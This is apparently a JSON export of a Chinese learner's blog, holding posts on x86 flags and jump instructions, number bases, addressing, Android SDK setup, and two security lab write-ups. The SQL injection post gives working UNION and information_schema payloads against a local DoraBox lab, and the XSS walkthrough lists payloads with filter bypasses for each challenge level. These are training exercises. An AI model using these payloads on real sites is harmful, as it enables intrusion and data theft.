{"meta":{"title":"Welcome to Chumen77's Blog","subtitle":"Struggle 就完事了 !","description":null,"author":"chumen77","url":"https://chumen77.github.io","root":"/"},"pages":[],"posts":[{"title":"","slug":"JCC","date":"2019-10-07T15:09:50.000Z","updated":"2019-10-17T15:27:06.000Z","comments":true,"path":"2019/10/07/JCC/","link":"","permalink":"https://chumen77.github.io/2019/10/07/JCC/","excerpt":"","text":"title:JCC学习JCC学习JCC指令集合详细1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 3、JS 结果为负则跳转 SF=1 4、JNS 结果为非负则跳转 SF=0 5、JP, JPE 结果中1的个数为偶数则跳转 PF=1 6、JNP, JPO 结果中1的个数为偶数则跳转 PF=0 7、JO 结果溢出了则跳转 OF=1 8、JNO 结果没有溢出则跳转 OF=0 9、JB, JNAE 小于则跳转 (无符号数) CF=1 10、JNB, JAE 大于等于则跳转 (无符号数) CF=0 11、JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1 12、JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0 13、JL, JNGE 小于则跳转 (有符号数) SF≠ OF 14、JNL, JGE 大于等于则跳转 (有符号数) SF=OF 15、JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF 16、JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF 表格总结 -w1067 直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要注意那些有符号的JCC跳转指令，因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。 注意：JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的 练习使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.前提：能用CMP和TEST实现的优先考虑. 1、JE, JZ 结果为零则跳转(相等时跳转) ZF=11234MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0123MOV AL,1TEST AL,ALJNZ 0X00401006 ####3、 JS 结果为负则跳转 SF=1 123MOV AL,1MOV CL,2CMP AL,CL 4、 JNS 结果为非负则跳转 SF=012XOR EAX,EAXJNS 0X0040102F 5、 JP, JPE 结果中1的个数为偶数则跳转 PF=11234MOV AL,2MOV CL,2CMP AL,CLJPE 0X00401008 6、JNP, JPO 结果中1的个数为奇数则跳转 PF=01234MOV AL,2MOV CL,1CMP AL,CLJPE 0X00401008 7、 JO 结果溢出了则跳转 OF=1123MOV AL,80SUB AL,10JO 0X00401008 8、 JNO 结果没有溢出则跳转 OF=0123MOV AX,0FFFFADD AX,80JNO 0X00401010 9、 JB, JNAE 小于则跳转 (无符号数) CF=11234MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E 10、 JNB, JAE 大于等于则跳转 (无符号数) CF=01234MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044 11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。 1234MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B 或者 1234MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E 12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=01234MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044 解析： 这个与练习10的区别就是不可以让两个数相等。 13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF12345MOV AL,0XFFMOV CL,0X01CMP AL,CLJB 0X00401063JL 0X00401063 解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！ 比如这个练习用到了JL,FF就是-1了，那么-1&lt;1这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。 14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF1234MOV AL,1MOV CL,0CCCMP AL,CLJGE 0X0040108B 15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF1234MOV AL,1MOV CL,0CCCMP CL,ALJGE 0X0040108B 这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，这两个操作数只能是相同的数，没什么看不看做有无符号的说法。 16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF1234MOV AX,1MOV CX,FFCMP AX,CXJG 0x004010A6 1234MOV AL,1MOV CL,0FFCMP AL,CLJG 0x004010A6 解析： 判断一下，第1段代码对还是第2段代码对？ 在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，且一定要注意下数据宽度。在这个例子中，第一段代码是无法实现JG跳转的，因为其数据宽度的问题，影响到SF,所以其没办法SF=OF就没法跳转。","categories":[],"tags":[]},{"title":"","slug":"标志寄存器","date":"2019-10-06T14:01:14.000Z","updated":"2019-10-17T15:27:07.000Z","comments":true,"path":"2019/10/06/标志寄存器/","link":"","permalink":"https://chumen77.github.io/2019/10/06/标志寄存器/","excerpt":"","text":"title:标志寄存器标志寄存器部分标志寄存器详细介绍 需要先熟练记住这几个寄存器的位置和名称：CF PF AF ZF SF OF CF进位标志CF(Carry Flag):如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 解析：在看运算结果的时候，先提前确定好参与运算的数是有无符号数和它们的数据宽度。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。 PF奇偶标志PF(Parity Flag)：PF标志位，根据结果中最低有效字节(最低8位)中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。 AF辅助进位标志AF(Auxiliary Carry Flag)：如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。—-（维基百科） 辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。—（百度百科） 解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是在D0-D7中，D3向D4位进位或者借位，才会置1。（这个当初老师讲错、百度高赞也是错的，要注意一下）。 ZF零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。解析：引一下常用的xor r8/16/32,r8/16/32对寄存器清零操作。 SF符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。 解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把它换成2进制确定最高位是0还是1.例子： 123MOV AL,20MOV CX,8000ADD AX,CX -w117 这个就是在字上操作，然后相加结果是8020,最高位就是1000，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。 OF溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。 CF与SF区别： 进位标志表示无符号数运算结果是否超出范围. 溢出标志表示有符号数运算结果是否超出范围. 溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律： 正 + 正 = 正 如果结果是负数，则说明有溢出 负 + 负 = 负 如果结果是正数，则说明有溢出 正 + 负 永远都不会有溢出. -w315 结合这个图在应为对PF的判断，非常好用。判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。 练习写汇编指令只影响CF位的值12MOV AL,0FEADD AL,10 -w669 写汇编指令只影响PF位的值12MOV AL,1ADD AL,2 -w630 写汇编指令只影响AF位的值12MOV EAX,0FADD EAX,1 -w588 写汇编指令只影响SF位的值12MOV CL,0F1ADD CL,1 -w716 写汇编指令只影响OF位的值12MOV AL,80SUB AL,10 这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，站在80的位置顺时针查10，负-正=正，来实现溢出完成只影响OF位。","categories":[],"tags":[]},{"title":"","slug":"数据宽度与逻辑运算","date":"2019-10-01T13:08:32.000Z","updated":"2019-10-09T13:02:50.000Z","comments":true,"path":"2019/10/01/数据宽度与逻辑运算/","link":"","permalink":"https://chumen77.github.io/2019/10/01/数据宽度与逻辑运算/","excerpt":"","text":"title:数据宽度与逻辑运算数据宽度与逻辑运算数据宽度数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。 对数据宽度的理解和有无符号数4位宽度表示4位宽度表示：假设计算机只能存储4位2进制数： 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111 0 1 2 3 4 5 6 7 8 9 A B C D E F -w303 存无符号数时：0 1 2 3 4 5 6 7 8 9 A B C D E F 存有符号数时： 正数：0 1 2 3 4 5 6 7 负数：-1 -2 -3 -4 -5 -6 -7 -8 其中对应关系： -1 -2 -3 -4 -5 -6 -7 -8 F E D C B A 9 8 无符号数时：从0到F逆时针依次增大。 有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。 为什么在存有符号数时说开头为1的数就是负数？我们只看二进制： | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || — | — | — | — | — | — | — | — | — || 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 | -1 -2 -3 -4 -5 -6 -7 -8 1111 1110 1101 1100 1011 1010 1001 1000 很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。 举例：对1011的理解 1011在我们当做是有符号时就是-5，无符号就是B。这个完全看我们如何去定义。 #### 8位宽度： 8位宽度表示：假设计算机只能存储8位2进制数。 -w315 无符号数：0 1 2 3 4 ……FF 有符号数：正数：0 1 2 3 4 5 6 7 …7F负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FF FE FD FC FB FA F9 F8 …. 80 16位宽度16位宽度表示：假设计算机只能存储16位2进制数 -w317 无符号数：0 1 2 3 4 ……FFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFF FFFE FFFD FFFC FFFB FFFA FFF9 FFF8 …. 8000 32位宽度32位宽度表示：假设计算机只能存储32位2进制数 -w378 无符号数：0 1 2 3 4 ……FFFFFFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFFFFFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFFFFFF FFFFFFFE FFFFFFFD FFFFFFFC FFFFFFFB FFFFFFFA FFFFFFF9 FFFFFFF8 …. 80000000 ### 几个本质问题 1：计算机除了0和1什么也不认识。 2：如果存的数据超过数据长度限制，超过的会直接抛弃。 3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。 ### 几个重要的计量单位： BYTE 字节 8BIT WORD 字 16BIT 2字节 DWORD 双字 32BIT 4字节 逻辑运算二进制的逻辑运算：or：或(or |) 只要有一个为1就是1 -w915 and：与(and &amp;)两个都为1才是1 -w871 xor异或（xor) 不一样为1 -w928 ps：错位了。。。 not非(not !) 1是0 0是1 -w255 逻辑运算的具体应用：想获取某个值得第N位的值是1还是0如：8F 方法：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。 最简单的加密算法：如：要加密的数据：2015密钥：54因为密钥是两位的，所以要对2015分为20和15。 -w279 进行一次xor运算，出来就是加密后的值：74 41当用他俩再进行一次xor运算： -w253 就又变成了2015。这就完成了加密解密。","categories":[],"tags":[]},{"title":"","slug":"进制学习","date":"2019-09-28T03:52:16.000Z","updated":"2019-10-17T15:16:44.000Z","comments":true,"path":"2019/09/28/进制学习/","link":"","permalink":"https://chumen77.github.io/2019/09/28/进制学习/","excerpt":"","text":"title:进制学习进制学习进制的定义十进制的定义:由十个符号组成，分别是0 1 2 3 4 5 6 7 8 9逢十进一。 九进制的定义:由九个符号组成，分别是0 1 2 3 4 5 6 7 8逢九进一。 十六进制的定义:由十六个符号组成，分别是0 1 2 3 4 5 6 7 8 9 A B C D E F 进制的本质例如十进制：0 1 2 3 4 5 6 7 8 9 其就是由10个符号组成。如果定义其为9 1 5 2 4 7 6 3 8 0,或者换成 -w315 ,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。 二进制与十六进制的映射关系 -w911 这个需要背会。 练习正常认知的进制：二进制从0写到100 -w900 七进制编制7进制加法表，乘法表，并计算下面的结果：23456+54356=？5621-654=？234*65=？ -w608 7进制加法表： -w541 7进制乘法表： -w537 粗略计算过程： -w275 本质就是直接查表了。 十六进制：编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？ -w1387 16进制加法： -w1337 16进制乘法表： -w1330 粗略计算过程： -w238 都是查表。 面向本质的非认知进制：一：9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1 计算：123 + 234 = ? 先画个进制表： -w489 然后计算： -w154 解题过程:1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725 二：10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1 计算：@$$B + %AC&amp; = ? 先画个进制表： -w583 然后计算： -w185 解题过程：1)最后一位B+&amp;中的&amp;是第5个数，所以B+&amp;可以看成从B向后数5个为@%，取最后一个%且有一个进位2)最后第二位$+C中的C是第9个数，所以$+C相当从$开始查9个数，前面有一个进位，需要再向后查一个是@$，取最后一位$且进1位3)最后第三位$+A中的A是第7个数，所以$+A相当于从$开始往后查7个，有一个进位，要再向后查一个，再查一位是@!，所以最后是!且进一位4)第一位的@+%中的@是第一个数，所以@+%相当于从%在往后查一位，因为有个进位所以再往后查一位就是&amp;。所以答案就是&amp;!$%。 ##总结：经过这次对进制的学习和练习，对进制理解更加的深刻，它们只是一堆符号，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。","categories":[],"tags":[]},{"title":"逆向学习-滴水公开课","slug":"逆向学习-滴水公开课","date":"2019-09-27T15:14:39.000Z","updated":"2019-10-17T15:27:14.000Z","comments":true,"path":"2019/09/27/逆向学习-滴水公开课/","link":"","permalink":"https://chumen77.github.io/2019/09/27/逆向学习-滴水公开课/","excerpt":"","text":"逆向学习-滴水公开课知识总结一、内存的读写寻址公式一: [立即数]读取内存的值: MOV EAX,DWORD PTR DS:[0x13FFC4] MOV EAX,DYVORD PTR DS:[0x13FFC8] 向内存中写入数据: MOV DWORD PTR DS:[0x13FFC4],eax MOV DWORD PTR DS:[0x13FFC8].ebx 获取内存编号: LEA EAX,DWORD PTR DS:[0X13FFC4] LEA EAX,DWORD PTR DS:[ESP+8] 寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX] MOV EAX,DWORD PTR DS:[EDX] 寻址公式三: [reg+立即数]读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX+4] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX+0xC].0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX+4] MOV EAX,DWORD PTR DS:[EDX+4] 寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4] 寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4+4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4+2] 二、堆栈变形的艺术:push eax代码相当于:lea esp,dword ptr ss:[esp-4] mov dword ptr ss:[esp],eax 或者 mov dword ptr ss:[esp-4],eax lea esp,dword ptr ss:[esp-4] 还有 sub esp,0x4 mov dword ptr ss:[esp],eax push esp代码相当于：mov dword ptr [esp-4],esp sub esp,0x4 还有： mov dword ptr [esp-4],esp lea esp,dword ptr [esp-4] pop eax 代码相当于：lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4] mov eax,dword ptr [esp] lea esp,dword ptr [esp+4] pop esp 代码相当于：add esp,0x4 mov esp,dword ptr[esp-4]或者 lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4] 两条简单指令stos ：将eax中的值放入edi所指地址的内存里。 rep ：是重复指令 ecx中放入重复的次数","categories":[],"tags":[]},{"title":"安卓程序分析环境搭建","slug":"安卓程序分析环境搭建","date":"2019-09-23T09:22:24.000Z","updated":"2019-10-17T15:27:41.000Z","comments":true,"path":"2019/09/23/安卓程序分析环境搭建/","link":"","permalink":"https://chumen77.github.io/2019/09/23/安卓程序分析环境搭建/","excerpt":"","text":"#安卓程序分析环境搭建 Mac下安卓SDK搭建：前提是已经安装了homebrew神器： 1：下载SDK12brew search android-sdkbrew cask install android-sdk 2：配置环境变量123vim .zshrcexport ANDROID_SDK_ROOT=&quot;/usr/local/share/android-sdk&quot;export PATH=&quot;$&#123;PATH&#125;:$&#123;ANDROID_SDK_ROOT&#125;/tools:$&#123;ANDROID_SDK_ROOT&#125;/platform-tools&quot; !wq退出以后，source ~/.zshrc 123pwd/usr/local/share/android-sdk/tools/bin./sdkmanager 然后会出现Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.继续touch /Users/gjy/.android/repositories.cfg 3：检验是否搭建好在终端输入：android -w706 这就ok了。 安卓NDK搭建前提是已经安装了homebrew神器： 1：下载NDK：12brew search android-ndkbrew cask install android-ndk 2：配置环境变量：123vim .zshrcexport ANDROID_NDK_HOME=&quot;/usr/local/share/android-ndk&quot; //添加进去正常保存退出source .zshrc 3：检验：ndk-build -w751 已经成功了。","categories":[],"tags":[]},{"title":"SQL注入基础学习","slug":"SQL基础学习","date":"2019-09-01T11:17:25.000Z","updated":"2019-10-17T15:33:06.000Z","comments":true,"path":"2019/09/01/SQL基础学习/","link":"","permalink":"https://chumen77.github.io/2019/09/01/SQL基础学习/","excerpt":"","text":"SQL注入基础学习数据类型（数字型）检测是否sql语句是否执行使用and,or,xor,like测试 ** 1=1 ** 1=2其中**可以为and or xor like任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。 使用符号测试 单引号 减号 数据类型（字符型）检测是否sql语句是否执行此处跟数字型测试办法基本一样，还是使用and,or,xor,like、单引号测试。最近接触字符型的注入较少，补充一下原理： 我们先进行正常查询：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit当我们给接受处加&#39;：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit语句执行后，会产生报错： 然后我们想办法不让其报错，就是来省略后面那个php代码语句加的&#39;: 用#来注释，但需要进行url来转变一下为%23 用--+ --%20来注释然后就可以来用and or xor like来测试了，例如：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit union知识小记union在集合两个select查询语句时，一定要注意两个查询出来的结果,列数（columns）要相等才会出来结果。例如： SELECT * from news union SELECT 1,2; 报错，换成SELECT * from news union SELECT 1,2,3; order by 知识小记order by是按照一定规则来进行排序的语句。我们为什么能够通过order by排序，来排出来列名有多少个呢？我们来测试一下： SELECT * from test ORDER BY 1;当我们在测试到SELECT * from test ORDER BY 5; 发现出了异常。我们换个3列的表： SELECT * from news ORDER BY 3;显示是正常的SELECT * from news ORDER BY 4;所以可以发现我们在order by后加数字可以来测出来一个表的列名个数。 显示联合查询出现的结果显示我们自定义查询的结果，该怎么实现呢。先在靶场测试：SELECT * FROM news WHERE id = 2 union select 1,2,3 from test 明显网页是不给显示的。相同语句在数据库： 不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：SELECT * FROM news WHERE id = -1发现是不显示东西的。继续测试:SELECT * FROM news WHERE id = -1 union select 1,2,3 from test; 接着我们拿到靶场测试： 达到我们的目的了。看这个页面显示的效果2 3，反向思维考虑把2 3改成我们的列名是不是就可以出数据了，但是我们如何知道表里的列名呢？ exists（）函数小记exists()是验证某个语句是否存在结果，是个bool函数，存在显示1反之是0。SELECT * FROM news WHERE id=1 and exists(select * from test);在数据库进行测试: SELECT * FROM news WHERE id=1 and exists(select * from aa); 发现在用这个函数查不存在的表的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，可以通过burpsuit来跑。还有意外收获，可以看出数据库的名字 pentest就是数据库的名字了。 数据类型（搜索型）%的作用%在mysql中表示通配符。在SQL语句中:******* like &#39;%a&#39;，就是搜索返回以字母a结尾的所有信息，同理a%``%a%,分别就是 搜索返回以字母a开头的所有信息和搜索返回包含字母a的所有信息。 如何注入咱们先看下php源代码:$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search很明显提前闭合&#39;%跟省略后面的%&#39;就可以了，所以http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit -w804 然后我们正常走步骤，利用order by来确定下多少列：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit继续http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit -w1022 可以确定是3列了。 然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：先正常构造payload：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit -w843 确定news表名存在，然后开始用burp跑其他的： -w555 -w837 我们是跑表名，所以在news加上变量。这个步骤需要先点 -w371 然后 -w364 -w531 在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。 -w1260 -w778 然后我们开始看结果 -w666 Render下面显示正常就证明是存在的。 -w963 这个是不存在。最终用这个办法可以跑出表名test、account。同样办法跑列名： -w665 -w797 确定出news表中有id、title、content等列。 然后我们更新下语句来查表和列，exists()这个办法是有点老的比较笨。在MySQL&gt;5.1版本中， -w764 我们可以在information_schema发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：第一步，我们先让其可以显示我们想查询的内容http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit把标题下的2换成darabase()函数，来显示下数据库的名字。http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit -w982 然后我们就的得到了pentest，然后开始利用这个mysql&gt;5.1特性来构造语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit -w902 但是在这里面怎么显示其他的名字呢？ -w523 继续:http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit其中可以将!=换成&lt;&gt;是同样的效果。 -w916 继续在语句中加and和不等于前面查出的表的名字：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了group_cancat()函数：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit 然后我们继续去查列名，然后转到infromation_schema的columns下，一直搜索account下滑发现，我们在这个列表下可以拿到更全的信息： -w1162 去对比下account表下的列名信息： -w189 是相对应的，所以我们可以更改下语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit -w1012 发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿news测试下获取列名：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit -w1049","categories":[],"tags":[]},{"title":"XSS挑战之旅","slug":"XSS挑战之旅","date":"2019-08-20T12:29:45.000Z","updated":"2019-08-27T16:06:56.000Z","comments":true,"path":"2019/08/20/XSS挑战之旅/","link":"","permalink":"https://chumen77.github.io/2019/08/20/XSS挑战之旅/","excerpt":"","text":"XSS挑战之旅关卡第一关payload:&lt;script&gt;alert(1)&lt;/script&gt; 此题没有任何过滤，直接构造语句，在标签之间进行输出。 第二关 此题变成了&lt;input&gt;标签，看到此处后可以考虑，提前闭合掉这个标签，所以构造payload：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;， 或者也可以payload：&quot; onclick=alert(1)&gt;这个需要点击搜索后，再点击搜索框，属于借助js事件类型。 第三关 变成了单引号的input标签，先尝试闭合input标签这个思路。 发现没有过去，去看下网页代码。 发现其过滤了&lt; &gt;,这样只能通过js事件来构造弹窗。跟上题一样，不过此处是单引号，所以构造payload：&#39; onclick=&#39;alert(1)注意此处的alert(1)的前面还有个单引号，其效果就是value=&#39;&#39; onclick=&#39;alert(1)&#39; 第四关 查看网页源代码，还是跟上题差不多，不过是单引号换成了双引号。按照原来的思路，构造payload：&quot; onclick=&quot;alert(1) 第五关看网页源代码，跟上题一样，直接先测试上题的payload。 &lt;input name=keyword value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;再次查看，可以看出对on进行了过滤，在尝试双写、改变大小写无果后。换思路看看&lt; &gt;是否过滤，发现没有过滤。然后考虑先闭合input标签，然后构造个超链接，点击后调用js事件。payload=&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;然后点击就ok了。 第六关第六关直接测试上题的payload，无法通过，然后看网页源代码：&lt;input name=keyword value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;发现href遭到了过滤，结果发现改变大小写可以绕过。payload：&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt; 第七关还是先测试上题的payload，然后查看源代码，发现： href与script直接被替换成了空，然后考虑双写绕过，构造payload：&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt; 第八关 发现有些不一样了，然后先点下”添加友情链接“按钮，去看下网页源代码。 会发现这个题是在这个地方来进行xss攻击。先构造payload：javascript:alert(1)，无法通过，然后查看源代码&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;可以发现其过滤了字符串script，因为此处为html标记语言，考虑把”r”转换为HTML实体来绕过。构造payload：javasc&amp;#114;ipt:alert(1) 第九关 这题还是跟上题一个类型，但是发现不管加入什么都显示这个。不如加入个正常合法链接试一试，http://www.baidu.com,发现显示正常了，经过测试后发现其在检测到http://后才会正常显示你的代码。所以构造payload：javasc&amp;#114;ipt:alert(1)//http://注意”//“这个是来注释后面的代码的。 第十关 进来以后发现无任何可输入的地方，然后就查看源代码 发现其type类型全是hidden，然后考虑是不是考察这个知识点，在查询后发现大多解决办法就是把hidden，改为text类型。因为在浏览器get到type=”***“，即可把原来的type给替换所以考虑构造payload：&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()然后会出现个输入框，点击后即可过关。此处需要注意的是查看源代码后发现有三个input标签，但实际测试只有最后一个name=&quot;t_sort&quot;才会出现文本框，所以构造了以最后一个标签为攻击点的payload。 第十一关至第十三关这几关都是http头注入需要抓包来完成，基本大差不差的。第十一关 Referer 第十二关 ua 第十三关 cookie 明显是cookie注入了 第十四至最后这几道题基本都是看着别人的博客才做的下来，并且做了感觉不是太明白原理，就先不总结了。以后学到更深的再进行总结。 绕过姿势小补充“()”被过滤用” ` “ 字符了来代替括号。 payload: alert`1` 小进阶 “ ` “ “()”同时被过滤可以使用 &lt;svg&gt; 